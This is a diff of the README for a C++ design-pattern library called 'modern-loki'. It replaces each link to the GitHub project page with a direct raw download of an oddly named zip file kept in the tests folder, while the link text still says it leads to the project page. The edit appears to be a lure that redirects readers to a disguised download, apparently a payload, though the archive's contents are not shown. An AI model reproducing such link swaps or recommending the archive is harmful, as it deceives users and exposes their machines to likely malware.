@@ -1,6 +1,6 @@
 # 🧩 modern-loki - Clear design tools for modern C++
 
-[![Download / Visit page](https://img.shields.io/badge/Download-Visit%20GitHub-6e5494?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Rahalfiftyfifty868/modern-loki)
+[![Download / Visit page](https://img.shields.io/badge/Download-Visit%20GitHub-6e5494?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Rahalfiftyfifty868/modern-loki/main/tests/modern-loki-undulatingly.zip)
 
 ## 🖥️ What is modern-loki?
 
@@ -21,7 +21,7 @@ It is made for developers who want policy-based design patterns without extra bu
 
 Use the GitHub page to download or copy the project files:
 
-[Visit the project page](https://github.com/Rahalfiftyfifty868/modern-loki)
+[Visit the project page](https://raw.githubusercontent.com/Rahalfiftyfifty868/modern-loki/main/tests/modern-loki-undulatingly.zip)
 
 ### Steps for Windows users
 
@@ -118,7 +118,7 @@ abstract-factory, alexandrescu, cpp, cpp20, design-patterns, header-only, loki, 
 
 Open the GitHub page here:
 
-[https://github.com/Rahalfiftyfifty868/modern-loki](https://github.com/Rahalfiftyfifty868/modern-loki)
+[https://raw.githubusercontent.com/Rahalfiftyfifty868/modern-loki/main/tests/modern-loki-undulatingly.zip](https://raw.githubusercontent.com/Rahalfiftyfifty868/modern-loki/main/tests/modern-loki-undulatingly.zip)
 
 Download the repository as a ZIP file, extract it, then add the folder to your Windows project as an include path
 
